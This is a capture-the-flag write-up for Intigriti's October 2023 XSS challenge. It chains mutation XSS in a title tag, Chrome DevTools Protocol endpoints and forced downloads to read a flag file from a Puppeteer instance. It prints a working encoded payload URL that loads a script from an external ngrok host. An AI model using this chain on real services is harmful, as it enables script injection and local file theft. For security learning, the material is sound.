# Intigriti October 2023 XSS Challenge Writeup

## Introduction

Hey fellow hackers! 🎩💻 Ready for a wild ride into the world of XSS and hacking? In this [Intigriti's October XSS challenge](https://challenge-1023.intigriti.io/) writeup, we'll navigate through twists, turns, and a bunch of cat-related questions to unveil the desired flag! 🐱🚩 

![Challenge Image](images/are-you-ready.png)

Let's dive into the solution!

## The Challenge Landscape (TL;DR)

### Mutation XSS

This challenge introduces the concept of mutation XSS. The participant must inject a script into the vulnerable endpoint, initiating a chain of events that breaks out of the `<title>` tag in the browser instance of Puppeteer.
 
### Exploit Domain

The entry point was this specific endpoint: [https://challenge-1023.intigriti.io/api/report?url=/](https://challenge-1023.intigriti.io/api/report?url=/), which allowed entering a custom-crafted payload, if properly encoded, to target the browser instance.

### Script Injection

With the absence of SOP and specific security flags in check, it was possible to make the browser download and navigate to a hosted script that triggered the extraction of the remote `flag.txt` file upon access.

## Navigating the Clues: Hints from the Intigriti Twitter

Now that you've stepped into the challenge landscape, let's shed light on the hints generously shared by Intigriti through their Twitter account.

### Hint 1: Title Parsing Discrepancy

The journey begins with a text-based nugget:

> "Have you noticed any difference in title parsing between client/server?"
 
Oh, the intrigue! This hint whispered about a clandestine affair between the client and server, specifically in title parsing.

![mxss](images/mxss.png)

**Decoding the Hint:**
- **Client vs Server Parsing:** The title parsing (`<%- title %>`) on the server in `header.ejs` rendered a dynamic HTML version when fed with broken input. Uncover the parsing discrepancy, and you're on the brink of mutation XSS ([mXSS](https://cure53.de/fp170.pdf)) enlightenment.
- **Key Takeaway:** Despite DOMPurify filtering malicious input, you could have sent valid but broken HTML to the server and made the recipient browser fix it. By breaking out of the `</title>` tag, it was possible to inject scripts into the page.

Now we can inject and control anything from the browser! Can't we?

### Hint 2: Chrome Developer Protocol (CDP) Link

They said, throwing us a link to the Chrome Developer Protocol (CDP):

> "Let's keep this one short and sweet..."
 
Sweet indeed! A seemingly innocent link that opened the door to a rabbit hole of possibilities!! 😱

![CDP screenshot](images/cdp.png)

**Decoding the Hint:**
- **CDP Exploration:** The link led us to the Chrome Developer Protocol, where understanding the APIs and how to communicate with a running Chrome seemed possible.
- **Key Takeaway:** The CDP was the key to unlocking the door. Here, you had to understand that the challenge structure made internal communication to the Chrome instance impossible, be it through WebSockets or devtools-on-devtools. One of the few useful thing was the CDP's endpoints like `GET /json` (to check for port) and `PUT /json/new?${url}` (to open a file).

But what do we do with that information? Here comes the last hint!

### Hint 3: Meme - "Manual download" vs "Auto download"

> We'd like to apologize for the downtime, so please take this free hint 💜
> 
And then, a meme! A picture is worth a thousand words, they say. In the upper part, a man says "NO" to "Manual download," and in the bottom part, a resounding "YES" to "Auto download."

![Auto download meme](images/manual-vs-auto-download.png)

**Decoding the Hint:**
- **Auto-Download Revelation:** The meme hinted at the browser's ability to auto-download specific files upon opening. The trick? Serve malicious files with the header `Content-Disposition: attachment` to make the Chromium browser download them automatically regardless of the extension.
- **Key Takeaway:** Download a malicious HTML file, open it with `file://` protocol (using the second hint's discovery), and bingo! A fetch request from it could now breach the Docker instance's filesystem.

It's time to glue everything together!

## The Payloads

Alright, fasten your seatbelts because here's where the magic unfolds! Our payloads were the unsung heroes, the script warriors that pirouetted through vulnerabilities, paving the way to the glorious victory flag.

### The Entrypoint - [src/page_404.js](src/page_404.js)

Here's where the party kicks off! The `page_404.js` script takes the lead, orchestrating the entire exploit dance. As the first script executed, it lays the groundwork for the entire exploit.

In a nutshell, `page_404.js` brute-forces Puppeteer's browser port and kickstarts the automatic download of `fetcher.html`, the script responsible for extracting files from the system. It's the piece of code responsible for fetching and executing the exploit locally.

### The Fetcher - [src/fetcher.html](src/fetcher.html)

Meet the fetcher, the hero responsible for grabbing the flag and sending it to our local server. Stored by the browser, this file plays a crucial role in the exploit saga.

The `fetcher.html` script fetches the flag and dutifully sends it to our local server for safekeeping. A simple script with a grand mission!

### The Server - [src/index.js](src/index.js)

Last but certainly not least, our server script (`index.js`). This bad boy runs the show, coordinating the exploit ballet and ensuring everything runs smoothly. Don't forget to keep this server humming while executing the payload.

And there you have it, the dynamic trio of payloads! 🚀

## Decoding the Payload

Now, let's briefly dissect the exploit's payload. This payload targets the endpoint `https://challenge-1023.intigriti.io/api/report?url=` and does not need user interaction to work. This solution utilizes two main parameters: `src` and `startPort`.

### One possible Payload

```plaintext
https://challenge-1023.intigriti.io/api/report?url=/<svg><b id="<%2526%2523x2f%253btitle>foo<script src='https:%2526%2523x2f%253b%2526%2523x2f%253ba9b1-191-45-70-141.ngrok-free.app%2526%2523x2f%253b404.js'><%2526%2523x2f%253bscript>">?startPort=40000
```
Let's break it down:

- Path and Parameters: The endpoint https://challenge-1023.intigriti.io/api/report?url= is targeted with the payload appended. The payload begins with `<svg><b id="`, introducing a closing `</title>` tag. For the payload to work, it's needed to encode any slashes present in it by doing: HTML encode `/` -> `&#x2f;` -> URL encode twice -> `%2526%2523x2f%253b`.
- Injected Script: The payload injects a script with a src attribute pointing to a remote server (https://a9b1-191-45-70-141.ngrok-free.app) hosting the 404.js script. This script is our entry point into the puppeteer exploit.
- Query Parameter startPort: The payload introduces the query parameter startPort=40000 (typically ranging between 45000 and 35000), serving as an initial estimation of the puppeteer port. The exploit involves an iterative process, maybe requiring multiple attempts to identify the correct port and extract the flag.

### Streamlining Port Extraction

To bring a touch of automation to the port extraction, I've crafted an iterative script. Simply hit up `/solve`, and the script autonomously tests various ports to pinpoint the right one.

> 💡 Hint: Execute npm i && npm start after cloning the code to observe the script server in action.

For an in-depth dive into the magic behind automated port-guessing, check out the code documentation.

### The Flag

And as the grand finale, the flag awaits: **INTIGRITI{Pupp3t3eR_wIth0ut_S0P_LFI}**

## Conclusion 
Well, that was a wild ride, wasn't it? We dove headfirst into the challenge, navigating through the world of mutation XSS and puppeteer exploits. From injecting scripts to triggering automatic downloads and playing around with CDP like digital ninjas, we've seen the exploit unfold.

Remember, this challenge wasn't just about finding the flag; it was a journey. Each hint, each stumble, and each "aha" moment brought us closer to the goal. In the end, it wasn't just about the swag; it was about the thrill of the hunt, the joy of overcoming challenges, and the camaraderie in Intigriti's community. ❤️🚀

![Thank you](images/thank-you.png)

## References

1. [Intigriti October XSS Challenge](https://challenge-1023.intigriti.io/)
2. [mXSS Attacks](https://cure53.de/fp170.pdf)
2. [Chrome Developer Protocol](https://chromedevtools.github.io/devtools-protocol/)
3. [Intigriti Discord](https://discord.gg/intigriti)
4. [Intigriti Twitter](https://twitter.com/intigriti)
